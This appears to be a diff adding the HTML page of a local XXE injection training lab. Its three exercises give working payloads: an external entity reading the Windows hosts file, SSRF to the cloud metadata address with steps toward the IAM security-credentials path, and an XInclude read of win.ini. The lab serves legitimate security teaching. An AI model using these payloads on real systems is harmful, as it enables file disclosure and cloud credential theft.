@@ -1,0 +1,106 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="xxe_injection.css">
+  <title>XXE Injection Lab</title>
+</head>
+
+<body>
+
+<header class="hero">
+  <h1>⚠️ XXE Injection Lab</h1>
+  <p>
+    XML External Entity (XXE) vulnerability demonstration environment for educational purposes.
+  </p>
+</header>
+
+<main class="container">
+
+  <div class="card">
+    <h2>📖 What is XXE?</h2>
+    <p>
+      XXE occurs when XML input is parsed insecurely, allowing attackers to read local files,
+      perform server-side request forgery (SSRF), and access internal resources.
+    </p>
+  </div>
+
+  <div class="warning">
+    ⚠️ Educational Use Only — Run these labs only on this local environment.
+  </div>
+
+  <!-- ── LAB 1 ── -->
+  <div class="card">
+    <h2>🧪 Lab 1 – File Read via XXE</h2>
+    <p style="color:#cbd5e1; margin-bottom:10px;">
+      Submit an XML payload with a <code style="color:#38bdf8">SYSTEM</code> entity pointing to a
+      local file. The server reads and returns the file contents.
+    </p>
+    <p style="color:#94a3b8; font-size:0.9rem; margin-bottom:6px;">💡 Example payload:</p>
+    <pre style="background:#0f172a; color:#38bdf8; padding:12px; border-radius:8px; font-size:0.82rem; overflow-x:auto; margin-bottom:12px;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"&gt;
+]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</pre>
+
+    <label for="xmlInput1">XML Payload:</label>
+    <textarea id="xmlInput1" placeholder="Enter XML payload for Lab 1..."></textarea>
+    <button onclick="runXXE('lab1', 'xmlInput1', 'result1')">Run Lab 1</button>
+    <div class="result-box" id="result1"></div>
+  </div>
+
+  <!-- ── LAB 2 ── -->
+  <div class="card">
+    <h2>🧪 Lab 2 – SSRF via XXE</h2>
+    <p style="color:#cbd5e1; margin-bottom:10px;">
+      Submit an XML payload with a <code style="color:#38bdf8">SYSTEM</code> entity pointing to an
+      internal HTTP URL. The server fetches it and returns the response — simulating AWS EC2
+      metadata exposure.
+    </p>
+    <p style="color:#94a3b8; font-size:0.9rem; margin-bottom:6px;">💡 Try these URLs in order:</p>
+    <pre style="background:#0f172a; color:#38bdf8; padding:12px; border-radius:8px; font-size:0.82rem; overflow-x:auto; margin-bottom:12px;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt;
+]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;
+
+&lt;!-- Step 2: http://169.254.169.254/latest/meta-data/iam/security-credentials/ --&gt;
+&lt;!-- Step 3: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin --&gt;</pre>
+
+    <label for="xmlInput2">XML Payload:</label>
+    <textarea id="xmlInput2" placeholder="Enter XML payload for Lab 2..."></textarea>
+    <button onclick="runXXE('lab2', 'xmlInput2', 'result2')">Run Lab 2</button>
+    <div class="result-box" id="result2"></div>
+  </div>
+
+  <!-- ── LAB 3 ── -->
+  <div class="card">
+    <h2>🧪 Lab 3 – XInclude Attack</h2>
+    <p style="color:#cbd5e1; margin-bottom:10px;">
+      When you cannot control the full XML document, use
+      <code style="color:#38bdf8">XInclude</code> to pull in a local file — bypassing the need
+      for a DOCTYPE declaration.
+    </p>
+    <p style="color:#94a3b8; font-size:0.9rem; margin-bottom:6px;">💡 Example payload:</p>
+    <pre style="background:#0f172a; color:#38bdf8; padding:12px; border-radius:8px; font-size:0.82rem; overflow-x:auto; margin-bottom:12px;">&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include href="file:///C:/Windows/win.ini" parse="text"/&gt;
+&lt;/foo&gt;</pre>
+
+    <label for="xmlInput3">XML Payload:</label>
+    <textarea id="xmlInput3" placeholder="Enter XML payload for Lab 3..."></textarea>
+    <button onclick="runXXE('lab3', 'xmlInput3', 'result3')">Run Lab 3</button>
+    <div class="result-box" id="result3"></div>
+  </div>
+
+</main>
+
+<footer class="back-link-box">
+  <a href="HomePage.html" class="back-link">Back to Home Page</a>
+</footer>
+
+<script src="xxe_injection.js"></script>
+
+</body>
+</html>
